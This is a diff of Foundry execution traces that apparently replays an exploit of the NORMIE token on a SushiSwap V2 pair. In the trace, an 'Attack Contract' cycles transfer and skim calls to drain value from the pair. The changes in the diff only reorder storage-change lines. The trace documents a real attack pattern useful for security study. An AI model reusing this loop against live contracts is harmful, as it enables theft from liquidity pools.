     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1504,9 +1412,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000010fb39a309cda34 → 0x0000000000000000000000000000000000000000000000000107a61da9f02465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000fc16078ab2fee → 0x0000000000000000000000000000000000000000000000000017cedcff57e5bd
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000010fb39a309cda34 → 0x0000000000000000000000000000000000000000000000000107a61da9f02465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1521,9 +1429,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017cedcff57e5bd → 0x0000000000000000000000000000000000000000000000000007a4a9919d85bd
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000107a61da9f02465 → 0x0000000000000000000000000000000000000000000000000117d05117aa8465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017cedcff57e5bd → 0x0000000000000000000000000000000000000000000000000007a4a9919d85bd
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 35755383060965502118 [3.575e19], 74210565210252389 [7.421e16], 1716694911 [1.716e9]
@@ -1533,8 +1441,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 2059749661501578423 [2.059e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 2059749661501578423 [2.059e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x000000000000000000000000000000000000000000000001f034a3742cde2ca6 → 0x000000000000000000000000000000000000000000000001d39ef00cb8d5cfef
     │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000001c95b36774085cb7
+    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x000000000000000000000000000000000000000000000001f034a3742cde2ca6 → 0x000000000000000000000000000000000000000000000001d39ef00cb8d5cfef
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 33695633399463923695 [3.369e19]
@@ -1567,8 +1475,8 @@ Traces:
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000117d05117aa8465 → 0x000000000000000000000000000000000000000000000000011fddcd9e573a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000117d05117aa8465 → 0x000000000000000000000000000000000000000000000000011fddcd9e573a34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1584,8 +1492,8 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007a4a9919d85bd → 0x000000000000000000000000000000000000000000000000000fb226184a3b8c
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000011fddcd9e573a34 → 0x0000000000000000000000000000000000000000000000000117d05117aa8465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000011fddcd9e573a34 → 0x0000000000000000000000000000000000000000000000000117d05117aa8465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1626,8 +1534,8 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000117d05117aa8465 → 0x0000000000000000000000000000000000000000000000000127fa848564e465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000117d05117aa8465 → 0x0000000000000000000000000000000000000000000000000127fa848564e465
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017bfa29ef6f15b → 0x0000000000000000000000000000000000000000000000000007956f313c915b
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
@@ -1671,8 +1579,8 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000127fa848564e465 → 0x000000000000000000000000000000000000000000000000013008010c119a34
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000127fa848564e465 → 0x000000000000000000000000000000000000000000000000013008010c119a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
@@ -1688,9 +1596,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000013008010c119a34 → 0x0000000000000000000000000000000000000000000000000127fa848564e465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007956f313c915b → 0x000000000000000000000000000000000000000000000000000fa2ebb7e9472a
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1698,8 +1606,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000127fa848564e465 → 0x000000000000000000000000000000000000000000000000013008010c119a34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1714,9 +1622,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000fa2ebb7e9472a → 0x0000000000000000000000000000000000000000000000000017b0683e95fcf9
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000013008010c119a34 → 0x0000000000000000000000000000000000000000000000000127fa848564e465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000fa2ebb7e9472a → 0x0000000000000000000000000000000000000000000000000017b0683e95fcf9
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1731,9 +1639,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017b0683e95fcf9 → 0x00000000000000000000000000000000000000000000000000078634d0db9cf9
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000127fa848564e465 → 0x000000000000000000000000000000000000000000000000013824b7f31f4465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017b0683e95fcf9 → 0x00000000000000000000000000000000000000000000000000078634d0db9cf9
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 31860569205479890319 [3.186e19], 83310565210252389 [8.331e16], 1716694911 [1.716e9]
@@ -1776,9 +1684,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000013824b7f31f4465 → 0x0000000000000000000000000000000000000000000000000140323479cbfa34
-    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000013824b7f31f4465 → 0x0000000000000000000000000000000000000000000000000140323479cbfa34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1793,8 +1701,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000078634d0db9cf9 → 0x000000000000000000000000000000000000000000000000000f93b1578852c8
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000140323479cbfa34 → 0x000000000000000000000000000000000000000000000000013824b7f31f4465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -1819,9 +1727,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000140323479cbfa34 → 0x000000000000000000000000000000000000000000000000013824b7f31f4465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f93b1578852c8 → 0x0000000000000000000000000000000000000000000000000017a12dde350897
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000140323479cbfa34 → 0x000000000000000000000000000000000000000000000000013824b7f31f4465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1836,9 +1744,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000013824b7f31f4465 → 0x00000000000000000000000000000000000000000000000001484eeb60d9a465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017a12dde350897 → 0x000000000000000000000000000000000000000000000000000776fa707aa897
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000013824b7f31f4465 → 0x00000000000000000000000000000000000000000000000001484eeb60d9a465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 30215312877817619800 [3.021e19], 87860565210252389 [8.786e16], 1716694911 [1.716e9]
@@ -1881,8 +1789,8 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001484eeb60d9a465 → 0x00000000000000000000000000000000000000000000000001505c67e7865a34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
@@ -1898,9 +1806,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000776fa707aa897 → 0x000000000000000000000000000000000000000000000000000f8476f7275e66
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001505c67e7865a34 → 0x00000000000000000000000000000000000000000000000001484eeb60d9a465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000776fa707aa897 → 0x000000000000000000000000000000000000000000000000000f8476f7275e66
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1908,8 +1816,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001484eeb60d9a465 → 0x00000000000000000000000000000000000000000000000001505c67e7865a34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1924,9 +1832,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001505c67e7865a34 → 0x00000000000000000000000000000000000000000000000001484eeb60d9a465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f8476f7275e66 → 0x000000000000000000000000000000000000000000000000001791f37dd41435
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000001505c67e7865a34 → 0x00000000000000000000000000000000000000000000000001484eeb60d9a465
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1986,8 +1894,8 @@ Traces:
     │   │   │   │   └─ ← [Stop]
